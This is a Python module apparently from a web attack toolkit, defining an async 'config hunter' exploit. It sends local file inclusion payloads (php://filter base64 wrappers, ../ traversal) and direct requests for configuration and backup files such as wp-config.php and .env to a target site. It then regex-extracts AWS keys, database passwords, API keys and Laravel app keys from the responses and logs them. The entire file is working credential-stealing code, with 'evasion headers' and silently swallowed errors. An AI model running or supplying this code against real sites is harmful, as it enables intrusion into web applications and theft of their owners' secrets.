import aiohttp
import asyncio
import re
import base64
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

async def exploit_config_hunter(url, param=None, log_callback=None, headers=None, proxy=None):
    """
    DEEP IMPACT: Config Hunter.
    Hunts for configuration files (wp-config, .env, etc.) via LFI or Direct Access.
    Extracts secrets (AWS, DB, API Keys) using Heuristic Analysis.
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    # Common Config Targets (Relative to webroot)
    config_targets = [
        "wp-config.php",
        "configuration.php",
        "config.php",
        ".env",
        "web.config",
        "app/config/parameters.yml",
        "sites/default/settings.php" # Drupal
    ]
    
    # Backup Extensions to Fuzz
    backup_exts = ["", ".bak", ".old", ".swp", "~", ".save"]
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    targets_to_try = []
    
    # Mode A: LFI Extraction (if param is provided)
    if param and param in params:
        for target in config_targets:
            # wrapper strategy for PHP files
            if target.endswith(".php"):
                # Use php://filter to read source info
                targets_to_try.append({
                    "method": "LFI_Wrapper",
                    "file": target,
                    "payload": f"php://filter/convert.base64-encode/resource={target}"
                })
            else:
                # Direct LFI
                targets_to_try.append({
                    "method": "LFI_Direct",
                    "file": target,
                    "payload": target # might need traversal ../../../
                })
                # Add traversal variants
                targets_to_try.append({
                    "method": "LFI_Direct_Traversal",
                    "file": target,
                    "payload": "../" * 5 + target
                })
                
    # Mode B: Direct Access (Source Leak)
    else:
        # Just append config names to the URL path
        path = parsed.path
        if not path.endswith("/"): path += "/"
        
        for target in config_targets:
            for ext in backup_exts:
                target_file = target + ext
                targets_to_try.append({
                    "method": "Direct_Access",
                    "file": target_file,
                    "url": f"{parsed.scheme}://{parsed.netloc}{path}{target_file}"
                })

    # Execute Hunt
    try:
        async with aiohttp.ClientSession(headers=final_headers) as session:
            
            # Helper to process content
            def extract_secrets(content, origin):
                extracted = []
                regexes = {
                    "AWS Keys": r"(AKIA[A-Z0-9]{16})",
                    "DB Password": r"(DB_PASSWORD|DB_PASS|db_password|password)['\"]?\s*=>?\s*['\"]?([^'\"\s]+)['\"]?",
                    "API Key": r"(API_KEY|api_key|SECRET|secret)['\"]?\s*[:=]\s*['\"]?([^'\"\s]+)['\"]?",
                    "Laravel App Key": r"(APP_KEY)=base64:([a-zA-Z0-9+/=]+)"
                }
                
                found_secrets = False
                for label, pattern in regexes.items():
                    matches = re.finditer(pattern, content)
                    for m in matches:
                        secret = m.group(0) # Capture full context or specific group
                        if len(secret) > 100: secret = secret[:100] + "..."
                        extracted.append(f"{label}: {secret}")
                        found_secrets = True
                        
                if found_secrets:
                    findings.append({
                        "type": "Sensitive Config Exposure",
                        "severity": "Critical",
                        "detail": f"Secrets extracted from {origin}",
                        "evidence": "\n".join(extracted),
                        "remediation": "Restrict access to configuration files."
                    })
                    if log_callback:
                        log_callback(f"   ðŸ”“ SECRET FOUND in {origin}!")
                        for s in extracted: log_callback(f"      -> {s}")

            # Run Checks
            for t in targets_to_try:
                # Construct URL for LFI
                if "LFI" in t["method"]:
                    p_copy = params.copy()
                    p_copy[param] = [t["payload"]]
                    check_url = urlunparse(parsed._replace(query=urlencode(p_copy, doseq=True)))
                else:
                    check_url = t["url"]
                    
                try:
                    async with session.get(check_url, timeout=5, ssl=False, proxy=proxy) as resp:
                        if resp.status == 200:
                            raw_content = await resp.text()
                            
                            content = raw_content
                            # Decode if Wrapper used
                            if t["method"] == "LFI_Wrapper":
                                # Extract base64 part? usually it returns the whole content as base64?
                                # Sometimes it's mixed.
                                # Let's try to base64 decode if it looks like b64
                                # Cleanup whitespace
                                clean = raw_content.strip().replace("\n", "").replace(" ", "")
                                try:
                                    decoded = base64.b64decode(clean).decode('utf-8', errors='ignore')
                                    content = decoded
                                except: pass
                            
                            # Pattern Match
                            extract_secrets(content, t["file"])
                            
                except: pass
                
    except: pass
    
    return findings
